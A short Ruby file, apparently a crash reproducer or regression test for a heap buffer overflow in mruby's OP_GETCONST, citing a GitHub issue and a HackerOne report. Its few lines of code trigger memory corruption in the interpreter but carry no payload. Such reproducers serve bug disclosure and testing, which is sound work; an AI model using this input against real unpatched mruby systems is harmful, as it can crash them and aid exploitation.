# Heap buffer overflow in OP_GETCONST
# Issue: https://github.com/mruby/mruby/issues/3686
# Reported via hackerone

loop do
  Module.initialize { break }
  break
end
puts break[0].to_s